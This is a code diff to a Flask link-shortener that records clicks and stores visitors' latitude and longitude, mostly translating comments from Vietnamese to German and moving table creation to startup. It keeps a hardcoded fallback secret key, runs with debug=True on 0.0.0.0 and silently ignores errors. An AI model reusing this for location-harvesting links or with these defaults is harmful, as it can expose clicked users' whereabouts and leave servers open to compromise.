@@ -12,22 +12,29 @@ from dotenv import load_dotenv
 load_dotenv()
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'your-secret-key-here'
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
 app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///location_tracker.db')
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
-# Khởi tạo database và CORS
+# Datenbank und CORS initialisieren
 db = SQLAlchemy(app)
 CORS(app)
 
-# Khởi tạo Hashids để tạo URL ngắn
+# Tabellen beim Start erstellen (wichtig für Vercel)
+with app.app_context():
+    try:
+        db.create_all()
+    except Exception:
+        pass
+
+# Hashids initialisieren für Kurz-URLs
 hashids = Hashids(min_length=6, salt="location-tracker-salt")
 
 # Models
 class TrackedLink(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     original_url = db.Column(db.String(2000), nullable=False)
-    short_code = db.Column(db.String(20), unique=True, nullable=False)
+    short_code = db.Column(db.String(20), unique=True, nullable=True)
     title = db.Column(db.String(200), nullable=False)
     description = db.Column(db.Text)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
@@ -41,7 +48,7 @@ class TrackedLink(db.Model):
             'short_code': self.short_code,
             'title': self.title,
             'description': self.description,
-            'created_at': self.created_at.isoformat(),
+            'created_at': self.created_at.isoformat() if self.created_at else None,
             'clicks': self.clicks,
             'short_url': url_for('redirect_link', short_code=self.short_code, _external=True)
         }
@@ -90,26 +97,26 @@ def create_link():
     try:
         data = request.get_json()
         original_url = data.get('url')
-        title = data.get('title', 'Untitled Link')
+        title = data.get('title', 'Unbenannter Link')
         description = data.get('description', '')
         
         if not original_url:
             return jsonify({'error': 'URL is required'}), 400
             
-        # Tạo link mới
+        # Neuen Link erstellen
         new_link = TrackedLink(
             original_url=original_url,
             title=title,
             description=description,
+            short_code='',
             creator_ip=request.remote_addr
         )
         
         db.session.add(new_link)
-        db.session.flush()  # Để lấy ID
+        db.session.flush()  # ID abrufen
         
-        # Tạo short code từ ID
-        short_code = hashids.encode(new_link.id)
-        new_link.short_code = short_code
+        # Short-Code aus ID generieren
+        new_link.short_code = hashids.encode(new_link.id)
         
         db.session.commit()
         
@@ -128,7 +135,7 @@ def redirect_link(short_code):
     if not link:
         return render_template('404.html'), 404
     
-    # Tăng counter clicks
+    # Click-Zähler erhöhen
     link.clicks += 1
     db.session.commit()
     
@@ -150,7 +157,7 @@ def save_location():
         if not link:
             return jsonify({'error': 'Link not found'}), 404
         
-        # Lưu dữ liệu vị trí
+        # Standortdaten speichern
         location_data = LocationData(
             link_id=link.id,
             latitude=latitude,
@@ -194,6 +201,4 @@ def page_not_found(e):
     return render_template('404.html'), 404
 
 if __name__ == '__main__':
-    with app.app_context():
-        db.create_all()
     app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000))) 
